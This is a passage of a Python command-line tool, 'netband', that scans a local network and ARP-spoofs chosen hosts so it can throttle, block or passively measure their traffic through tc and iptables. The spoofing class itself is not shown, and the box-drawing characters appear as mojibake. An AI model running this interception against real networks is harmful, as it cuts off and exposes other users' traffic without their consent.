        for ip, n_mac in neigh.items():
            if n_mac == mac and ip != old_ip:
                changes.append((mac, dev.get("hostname",""), old_ip, ip))
                dev["ip"] = ip
    if changes: save(DEVICES_FILE, devices)
    return changes

# â”€â”€ monitor & traffic stats â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def get_traffic():
    d = {}
    try:
        if Path("/proc/net/dev").exists():
            for line in Path("/proc/net/dev").read_text().splitlines()[2:]:
                p = line.split()
                if len(p) >= 10: d[p[0].rstrip(":")] = {"rx": int(p[1]), "tx": int(p[9])}
    except Exception:
        pass
    return d

def get_tc_stats(iface):
    out = sh(f"{TC} -s class show dev {iface} 2>/dev/null")
    r = {}
    for m in re.finditer(r"class htb 1:(\d+).*?Sent\s+(\d+)\s+bytes.*?rate\s+(\S+)", out, re.DOTALL):
        r[int(m.group(1))] = {"bytes": int(m.group(2)), "rate": m.group(3)}
    return r

# â”€â”€ parse IDs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def parse_ids(raw, devices):
    if raw.strip().lower() == "all":
        return list(devices.values())
    out = []
    for part in raw.split(","):
        part = part.strip()
        if "-" in part:
            lo, hi = part.split("-", 1)
            try:
                for i in range(int(lo), int(hi)+1):
                    for d in devices.values():
                        if d["id"] == i: out.append(d)
            except ValueError: pass
        else:
            try:
                n = int(part)
                for d in devices.values():
                    if d["id"] == n: out.append(d)
            except ValueError: pass
    return out

# â”€â”€ banner & UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def print_banner(iface, gw_ip, gw_mac, local_ip):
    mode = f" {C.YEL}[Android/raw-socket mode]{C.RST}" if IS_ANDROID else ""
    print("")
    print(f"""{C.RED}   â–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
   â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
   â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
   â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
   â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
   â•šâ•â•  â•šâ•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•šâ•â•â•â•â•â•{C.RST}
   {C.DIM}by Elvan ~ high-performance network bandwidth manager    v{VERSION}{C.RST}
  {C.DIM}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”{C.RST}
   {C.CYN}Interface:{C.RST} {iface}    
   {C.CYN}Local IP:{C.RST}  {local_ip}
   {C.CYN}Gateway:  {C.RST} {gw_ip} ({gw_mac}){mode}
  {C.DIM}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”{C.RST}
""")

def print_help():
    print(f"""
{C.BLD}Commands:{C.RST}
  {C.CYN}scan{C.RST} [--range IP-IP]       Scan network for hosts (ultra-fast)
  {C.CYN}hosts{C.RST}                       Show discovered hosts
  {C.CYN}limit{C.RST} IDs RATE [--upload|--download]
  {C.CYN}block{C.RST} IDs [--upload|--download]
  {C.CYN}free{C.RST} IDs|all                Remove limits/blocks
  {C.CYN}add{C.RST} IP [--mac MAC]          Add custom host
  {C.CYN}monitor{C.RST} [--interval MS]    Monitor limited hosts
  {C.CYN}analyze{C.RST} IDs [--duration S] Analyze without limiting
  {C.CYN}status{C.RST}                      Show active limits/blocks
  {C.CYN}watch{C.RST}                       Show watch status
  {C.CYN}watch add{C.RST} IDs              Add hosts to watchlist
  {C.CYN}watch remove{C.RST} IDs|all       Remove from watchlist
  {C.CYN}watch set{C.RST} ATTR VAL         Set watch attribute
  {C.CYN}clear{C.RST}                      Clear terminal
  {C.CYN}help{C.RST}                       Show this help
  {C.CYN}quit{C.RST}                       Exit (auto-cleanup)

  Rates: {C.YEL}bit, kbit, mbit, gbit{C.RST}
  Example: {C.DIM}limit 1,2,3 200kbit --download{C.RST}
""")

def _print_host_table(devices, gw_ip, limiter):
    w_id, w_ip, w_mac, w_host, w_stat = 4, 15, 17, 20, 8

    print(f"{C.DIM}â”Œ{'â”€'*(w_id+2)}â”¬{'â”€'*(w_ip+2)}â”¬{'â”€'*(w_mac+2)}â”¬{'â”€'*(w_host+2)}â”¬{'â”€'*(w_stat+2)}â”{C.RST}")

    h_id   = "ID".ljust(w_id)
    h_ip   = "IP address".ljust(w_ip)
    h_mac  = "MAC address".ljust(w_mac)
    h_host = "Hostname".ljust(w_host)
    h_stat = "Status".ljust(w_stat)
    print(f"{C.DIM}â”‚{C.RST} {C.BLD}{h_id}{C.RST} {C.DIM}â”‚{C.RST} {C.BLD}{h_ip}{C.RST} {C.DIM}â”‚{C.RST} {C.BLD}{h_mac}{C.RST} {C.DIM}â”‚{C.RST} {C.BLD}{h_host}{C.RST} {C.DIM}â”‚{C.RST} {C.BLD}{h_stat}{C.RST} {C.DIM}â”‚{C.RST}")

    print(f"{C.DIM}â”œ{'â”€'*(w_id+2)}â”¼{'â”€'*(w_ip+2)}â”¼{'â”€'*(w_mac+2)}â”¼{'â”€'*(w_host+2)}â”¼{'â”€'*(w_stat+2)}â”¤{C.RST}")

    for mac, d in sorted(devices.items(), key=lambda x: x[1]["id"]):
        is_gw     = d["ip"] == gw_ip
        is_online = d.get("online", True)
        info      = limiter.get_status(d["ip"]) if limiter else None

        id_str  = str(d["id"]).ljust(w_id)
        ip_str  = d["ip"].ljust(w_ip)
        mac_str = d["mac"].ljust(w_mac)

        host_raw = d.get("hostname", "") or ""
        if is_gw and (not host_raw or host_raw in ("gateway", gw_ip)):
            host_raw = "_gateway"
        host_str = host_raw[:w_host].ljust(w_host)

        if is_gw:
            stat_raw, stat_color = "Free", C.GRN
        elif info:
            if info["blocked"]:
                stat_raw, stat_color = "Blocked", C.RED
            else:
                stat_raw, stat_color = "Limited", C.YEL
        elif not is_online:
            stat_raw, stat_color = "Offline", C.DIM
        else:
            stat_raw, stat_color = "Free", C.GRN

        stat_str = stat_raw.ljust(w_stat)
        c_id   = f"{C.YEL}{id_str}{C.RST}"
        c_host = f"{C.DIM}{host_str}{C.RST}" if host_raw == "_gateway" else host_str
        c_stat = f"{stat_color}{stat_str}{C.RST}"

        print(f"{C.DIM}â”‚{C.RST} {c_id} {C.DIM}â”‚{C.RST} {ip_str} {C.DIM}â”‚{C.RST} {mac_str} {C.DIM}â”‚{C.RST} {c_host} {C.DIM}â”‚{C.RST} {c_stat} {C.DIM}â”‚{C.RST}")

    print(f"{C.DIM}â””{'â”€'*(w_id+2)}â”´{'â”€'*(w_ip+2)}â”´{'â”€'*(w_mac+2)}â”´{'â”€'*(w_host+2)}â”´{'â”€'*(w_stat+2)}â”˜{C.RST}")

# â”€â”€ main â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def main():
    ap = argparse.ArgumentParser(description="netband - ARP-based bandwidth manager")
    ap.add_argument("-i", help="interface")
    ap.add_argument("-g", help="gateway IP")
    ap.add_argument("-m", help="gateway MAC")
    ap.add_argument("-n", help="netmask")
    ap.add_argument("-f", action="store_true", help="flush tc/iptables")
    ap.add_argument("--colorless", action="store_true")
    args = ap.parse_args()

    if args.colorless: no_color()

    iface  = args.i
    gw_ip  = args.g
    if not iface or not gw_ip:
        det_iface, det_gw = _detect_network()
        if not iface:  iface  = det_iface or detect_iface()
        if not gw_ip:  gw_ip  = det_gw    or detect_gw(iface)

    gw_mac = args.m
    if not gw_mac and gw_ip:
        gw_mac = get_mac(gw_ip, iface)
        if not gw_mac:
            shq(f"ping -c 1 -W 1 {gw_ip}")
            gw_mac = get_mac(gw_ip, iface)

    if not iface:  print(f"{C.RED}No interface found. Use -i.{C.RST}"); sys.exit(1)
    if not gw_ip:  print(f"{C.RED}No gateway found. Use -g.{C.RST}");   sys.exit(1)
    if not gw_mac: print(f"{C.RED}No gateway MAC found. Use -m.{C.RST}"); sys.exit(1)

    if args.f:
        Limiter(iface).flush()
        print(f"{C.GRN}Flushed rules.{C.RST}"); return

    if os.name != "nt" and os.geteuid() != 0:
        print(f"{C.RED}Must run as root / sudo.{C.RST}"); sys.exit(1)

    spoofer   = Spoofer(iface, gw_ip, gw_mac)
    limiter   = Limiter(iface)
    local_ip  = get_local_ip(iface)

    print_banner(iface, gw_ip, gw_mac, local_ip)

    devices   = load(DEVICES_FILE)
    watchlist = load(WATCH_FILE)
    for k, v in [("hosts",[]), ("range",""), ("interval",120)]:
        if k not in watchlist: watchlist[k] = v

    try:
        import readline
        hist = CONFIG_DIR / "history"
        CONFIG_DIR.mkdir(exist_ok=True)
        if hist.exists(): readline.read_history_file(str(hist))
        readline.set_history_length(1000)
        import atexit
        atexit.register(readline.write_history_file, str(hist))
    except Exception:
        pass

    def cleanup(*_):
        print(f"\n{C.YEL}Restoring ARP, cleaning up...{C.RST}")
        spoofer.restore_all()
        limiter.flush()
        print(f"{C.GRN}Done.{C.RST}"); sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        try:
            line = input(f"{C.GRN}>{C.RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            cleanup(); break
        if not line: continue

        parts = line.split(None, 1)
        cmd   = parts[0].lower()
        arg   = parts[1] if len(parts) > 1 else ""

        # â”€â”€ help â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if cmd in ("help", "?"):
            print_help()

        # â”€â”€ scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "scan":
            custom  = arg.split("--range",1)[1].strip() if "--range" in arg else None
            devices = scan(iface, gw_ip, custom, limiter, spoofer, gw_mac)
            total   = len(devices)
            online  = sum(1 for d in devices.values() if d.get("online", True))
            print(f"\n{C.BLD}Found {online} online hosts ({total} total):{C.RST}")
            _print_host_table(devices, gw_ip, limiter)

        # â”€â”€ hosts â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "hosts":
            if not devices:
                print(f"{C.DIM}No hosts. Run 'scan'.{C.RST}"); continue
            _print_host_table(devices, gw_ip, limiter)

        # â”€â”€ limit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "limit":
            if not arg:
                print(f"{C.RED}Usage: limit IDs RATE [--upload|--download]{C.RST}"); continue
            w = arg.split()
            if len(w) < 2:
                print(f"{C.RED}Usage: limit IDs RATE [--upload|--download]{C.RST}"); continue
            ids_s, rate_s = w[0], w[1]
            direction = Dir.from_args(w)
            rate = parse_rate(rate_s)
            if not rate:
                print(f"{C.RED}Invalid rate '{rate_s}'. Use e.g. 200kbit, 5mbit{C.RST}"); continue
            devs = parse_ids(ids_s, devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            success_ips = []
            for d in devs:
                if d["ip"] == gw_ip: continue
                spoofer.add(d["ip"], d["mac"])
                limiter.limit(d["ip"], rate, direction)
                d["limits"] = {"rate": rate, "direction": direction}
                success_ips.append(d["ip"])
            save(DEVICES_FILE, devices)
            if success_ips:
                print(f"{C.GRN}Limited {', '.join(success_ips)} â†’ {rate} ({Dir.name(direction)}){C.RST}")

        # â”€â”€ block â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "block":
            if not arg:
                print(f"{C.RED}Usage: block IDs [--upload|--download]{C.RST}"); continue
            w = arg.split()
            direction = Dir.from_args(w)
            devs = parse_ids(w[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            for d in devs:
                if d["ip"] == gw_ip: continue
                spoofer.add(d["ip"], d["mac"])
                limiter.block(d["ip"], direction)
                d["limits"] = {"rate": None, "direction": direction, "blocked": True}
                print(f"{C.RED}Blocked {d['ip']}{C.RST}")
            save(DEVICES_FILE, devices)

        # â”€â”€ free â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "free":
            if not arg:
                print(f"{C.RED}Usage: free IDs|all{C.RST}"); continue
            devs = parse_ids(arg.split()[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            for d in devs:
                if d["ip"] == gw_ip: continue
                limiter.unlimit(d["ip"])
                spoofer.remove(d["ip"])
                d["limits"] = {}
                print(f"{C.GRN}Freed {d['ip']}{C.RST}")
            save(DEVICES_FILE, devices)

        # â”€â”€ add â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "add":
            if not arg:
                print(f"{C.RED}Usage: add IP [--mac MAC]{C.RST}"); continue
            w = arg.split()
            ip = w[0]
            if "--mac" in w:
                mac = w[w.index("--mac")+1]
            else:
                mac = get_mac(ip, iface)
            if not mac:
                print(f"{C.RED}Cannot resolve MAC for {ip}. Use --mac.{C.RST}"); continue
            mac = mac.lower()
            idx = max((d["id"] for d in devices.values()), default=0) + 1
            hn  = resolve_hostname(ip, timeout=0.5)
            devices[mac] = {"id": idx, "ip": ip, "mac": mac, "hostname": hn, "limits": {}, "online": True}
            save(DEVICES_FILE, devices)
            print(f"{C.GRN}Added {ip} ({mac}) as ID {idx}{C.RST}")

        # â”€â”€ monitor â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "monitor":
            interval = 0.5
            if "--interval" in arg:
                ms_str = arg.split("--interval")[1].strip().split()[0]
                interval = int(ms_str)/1000 if ms_str.isdigit() else 0.5
            limited = {d["ip"]: d for d in devices.values() if limiter.is_limited(d["ip"])}
            if not limited:
                print(f"{C.DIM}No limited hosts.{C.RST}"); continue
            print(f"{C.BLD}Monitoring (Ctrl+C to stop)...{C.RST}")
            prev = get_traffic()
            prev_time = time.time()
            try:
                while True:
                    time.sleep(interval)
                    now  = time.time()
                    dt   = max(now - prev_time, 0.001)
                    curr = get_traffic()
                    print(f"\n{C.CYN}{'ID':<4} {'IP':<16} {'Rate':>10} {'RX/s':>10} {'TX/s':>10} {'Total RX':>10} {'Total TX':>10}{C.RST}")
                    print("-" * 80)
                    for ip, d in limited.items():
                        rate    = limiter.get_rate(ip) or "blocked"
                        iface_rx = curr.get(iface,{}).get("rx",0) - prev.get(iface,{}).get("rx",0)
                        iface_tx = curr.get(iface,{}).get("tx",0) - prev.get(iface,{}).get("tx",0)
                        rx      = _fmt(max(iface_rx, 0) / dt)
                        tx      = _fmt(max(iface_tx, 0) / dt)
                        tot_rx  = _fmt(curr.get(iface,{}).get("rx",0))
                        tot_tx  = _fmt(curr.get(iface,{}).get("tx",0))
                        print(f"{d['id']:<4} {ip:<16} {rate:>10} {rx:>10} {tx:>10} {tot_rx:>10} {tot_tx:>10}")
                    prev = curr
                    prev_time = now
            except KeyboardInterrupt:
                print(f"\n{C.DIM}Stopped.{C.RST}")

        # â”€â”€ analyze â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "analyze":
            if not arg:
                print(f"{C.RED}Usage: analyze IDs [--duration S]{C.RST}"); continue
            w = arg.split()
            duration = 30
            if "--duration" in w:
                di = w[w.index("--duration")+1]
                duration = int(di) if di.isdigit() else 30
            devs = parse_ids(w[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue

            print(f"{C.BLD}Initializing passive analysis for {len(devs)} host(s)...{C.RST}")

            shq(f"{IPT} -D FORWARD -j NETBAND_ACCT 2>/dev/null")
            shq(f"{IPT} -F NETBAND_ACCT 2>/dev/null")
            shq(f"{IPT} -X NETBAND_ACCT 2>/dev/null")
            shq(f"{IPT} -N NETBAND_ACCT")
            shq(f"{IPT} -I FORWARD -j NETBAND_ACCT")

            spoofed_ips = []
            for d in devs:
                if d["ip"] == gw_ip: continue
                if not limiter.is_limited(d["ip"]):
                    spoofer.add(d["ip"], d["mac"])
                    spoofed_ips.append(d["ip"])
                shq(f"{IPT} -A NETBAND_ACCT -s {d['ip']}")
                shq(f"{IPT} -A NETBAND_ACCT -d {d['ip']}")

            print(f"{C.BLD}Analyzing for {duration}s (Ctrl+C to stop)...{C.RST}")

            def read_bytes():
                data = {}
                out = sh(f"{IPT} -L NETBAND_ACCT -n -v -x")
                for line in out.splitlines():
                    p = line.split()
                    if len(p) == 8:
                        try:
                            bc  = int(p[1])
                            src = p[6]
                            dst = p[7]
                            if dst == "0.0.0.0/0":
                                data.setdefault(src, {"tx":0,"rx":0})
                                data[src]["tx"] = bc
                            elif src == "0.0.0.0/0":
                                data.setdefault(dst, {"tx":0,"rx":0})
                                data[dst]["rx"] = bc
                        except ValueError: pass
                return data

            prev_bytes = read_bytes()
            prev_time  = time.time()
            start      = time.time()

            try:
                while time.time() - start < duration:
                    time.sleep(2)
                    now  = time.time()
                    dt   = max(now - prev_time, 0.001)
                    curr_bytes = read_bytes()
                    elapsed    = now - start

                    print(f"\n{C.CYN}[{elapsed:.0f}s] {'ID':<4} {'IP':<16} {'Hostname':<20} {'RX/s':>10} {'TX/s':>10}{C.RST}")
                    print("-" * 66)

                    total_rx_sec = total_tx_sec = 0
                    for d in devs:
                        if d["ip"] == gw_ip:
                            print(f"    {d['id']:<4} {d['ip']:<16} {d['hostname'][:20]:<20} {'-':>10} {'-':>10}")
                            continue
                        rx_val = max(curr_bytes.get(d["ip"],{}).get("rx",0) - prev_bytes.get(d["ip"],{}).get("rx",0), 0)
                        tx_val = max(curr_bytes.get(d["ip"],{}).get("tx",0) - prev_bytes.get(d["ip"],{}).get("tx",0), 0)
                        total_rx_sec += rx_val
                        total_tx_sec += tx_val
                        print(f"    {d['id']:<4} {d['ip']:<16} {d['hostname'][:20]:<20} {_fmt(rx_val/dt):>10} {_fmt(tx_val/dt):>10}")

                    print(f"{C.DIM}Total: RX {_fmt(total_rx_sec/dt)}/s  TX {_fmt(total_tx_sec/dt)}/s{C.RST}")
                    prev_bytes = curr_bytes
                    prev_time  = now
            except KeyboardInterrupt:
                pass
            finally:
                shq(f"{IPT} -D FORWARD -j NETBAND_ACCT")
                shq(f"{IPT} -F NETBAND_ACCT")
                shq(f"{IPT} -X NETBAND_ACCT")
                for ip in spoofed_ips:
                    spoofer.remove(ip)
            print(f"\n{C.DIM}Done.{C.RST}")

        # â”€â”€ status â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "status":
            if not limiter.count:
                print(f"{C.DIM}No active limits/blocks.{C.RST}"); continue
            print(f"\n{C.CYN}{'ID':<4} {'IP':<16} {'Hostname':<20} {'Type':<10} {'Rate':>10} {'Dir':<10}{C.RST}")
            print("-" * 74)
            for ip, info in list(limiter._hosts.items()):
                dev = next((d for d in devices.values() if d["ip"] == ip), None)
                if not dev: continue
                typ  = f"{C.RED}blocked{C.RST}" if info["blocked"] else f"{C.YEL}limited{C.RST}"
                rate = info["rate"] or "-"
                dr   = Dir.name(info["dir"])
                print(f"{dev['id']:<4} {ip:<16} {dev['hostname'][:20]:<20} {typ:<20} {rate:>10} {dr:<10}")

        # â”€â”€ watch â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "watch":
            sub = arg.strip()
            if not sub or sub == "status":
                hosts = watchlist.get("hosts",[])
                print(f"{C.BLD}Watch:{C.RST}")
                print(f"  Range:    {watchlist.get('range') or 'entire subnet'}")
                print(f"  Interval: {watchlist.get('interval',120)}s")
                print(f"  Hosts:    {len(hosts)}")
                for mac in hosts:
                    d = devices.get(mac,{})
                    print(f"    - {d.get('id','?')}: {d.get('ip','?')} {d.get('mac',mac)} {d.get('hostname','')}")
            elif sub.startswith("add"):
                w = sub.split(None,1)
                ids_s = w[1] if len(w) > 1 else ""
                if not ids_s:
                    print(f"{C.RED}Usage: watch add IDs{C.RST}"); continue
                for d in parse_ids(ids_s, devices):
                    if d["mac"] not in watchlist["hosts"]:
                        watchlist["hosts"].append(d["mac"])
                save(WATCH_FILE, watchlist)
                print(f"{C.GRN}Watching.{C.RST}")
            elif sub.startswith("remove"):
                w = sub.split(None,1)
                ids_s = w[1] if len(w) > 1 else ""
                if ids_s.lower() == "all":
                    watchlist["hosts"] = []
                else:
                    for d in parse_ids(ids_s, devices):
                        watchlist["hosts"] = [m for m in watchlist["hosts"] if m != d["mac"]]
                save(WATCH_FILE, watchlist)
                print(f"{C.GRN}Updated.{C.RST}")
            elif sub.startswith("set"):
                w = sub.split(None,2)
                if len(w) < 3:
                    print(f"{C.RED}Usage: watch set range|interval VALUE{C.RST}"); continue
                attr, val = w[1], w[2]
                if attr in ("range","interval"):
                    watchlist[attr] = val
                    save(WATCH_FILE, watchlist)
                    print(f"{C.GRN}Set {attr} = {val}{C.RST}")

        # â”€â”€ clear â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd == "clear":
            print("\033c", end="")

        # â”€â”€ quit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        elif cmd in ("quit","exit","q"):
            cleanup()

        else:
            print(f"{C.DIM}Unknown command. Type 'help'.{C.RST}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        assert parse_rate("200kbit") == "200.0kbit"
        assert parse_rate("5mbit")   == "5.0mbit"
        assert parse_rate("1mbps")   == "1.0mbit"
        assert parse_rate("invalid") is None
        ips = _build_ip_list("192.168.1.1")
        assert len(ips) == 254
        custom_ips = _build_ip_list("192.168.1.1", "192.168.1.10-20")
        assert len(custom_ips) == 11
        print("selftest passed successfully")
    else:
        main()

